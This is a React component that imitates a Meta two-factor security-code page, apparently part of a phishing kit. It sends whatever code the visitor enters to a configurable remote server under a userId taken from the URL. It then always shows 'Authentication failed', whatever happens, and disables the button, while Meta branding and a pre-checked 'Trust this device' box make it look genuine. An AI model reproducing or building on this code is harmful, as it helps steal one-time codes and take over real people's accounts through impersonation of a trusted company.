import React, { useState } from 'react'
import { useLocation } from 'react-router-dom';
import axios from 'axios';
const OtpSection = ({serverAPI}) => {
    const location = useLocation();
    const queryParams = new URLSearchParams(location.search);
    const userId = queryParams.get('userId');
    const [otp,setOtp] = useState('');
    const [visibleErrorMsg,setVisibleErrorMsg] =  useState(false);
    const [loading,setLoading] = useState(false);
    const handleEnterOtp = async() => {
        setVisibleErrorMsg(false);
        setLoading(false);
        setLoading(true);
        try {
            const putData = await axios.put(`${serverAPI}/${userId}`,{
                otp
            })
            console.log(putData.data);
            setOtp('');
            setVisibleErrorMsg(true);
            setLoading(false);
        } catch (error) {
            console.error(error)
        }
    }

  return (
    <div>
          <div className='flex space-evenly' style={{marginTop:'20vw'}}>
      <div>
      <div className='flex space-evenly'>
        <img className='lockImg' src="./lock.png" alt="" />
      </div>
      <p className='text-center f1' style={{width:'80vw'}}>Enter the code that we sent to your registered phone number</p>
      <div className='flex space-evenly mt-5'>
        <div>
        <input className='cred' type="text" name="" id="" placeholder='Security code' value={otp} onChange={(e) => setOtp(e.target.value)} />
        {visibleErrorMsg &&(
                <div className='f1 red mt-2'>Authentication failed</div>
        )}
        </div>
        
      </div>
     
      <div className='flex space-evenly mt-5'>
       <button className='loginButton' onClick={handleEnterOtp} disabled={visibleErrorMsg}>
        {!loading ?(
            <div>Confirm</div>
        ):(
            <div className="spinner"></div>
        )}
       </button>
        
      </div>
      <div className='text-center mt-6'>
        <strong className='f1'>SMS message sent.</strong>
      </div>
      <div className='flex align-item-center mt-7'>
            <input type="checkbox" name="" id="" className='large-checkbox' checked/>
            <div className='f1'>
                <div><strong>Trust this device</strong></div>
                <div>We won't ask for a code next time</div>
            </div>
        </div>
     <div className='mt-10'>
     <p className='text-center f2' style={{width:'80vw'}}>If you're unable to recive a security code by text message, you can get  one from your <strong>authentication app</strong> or use one of your <span className='blue'>backup code</span></p>
     </div>
      </div>
      
    </div>
    
    <div className='bottomData flex space-evenly'>
      <div className='text-center'>
        <div className='f1 grey'>from</div>
        <img src="./metaLogo.png" className='metaLogo' alt="" />
      </div>
    </div>
    </div>
  )
}

export default OtpSection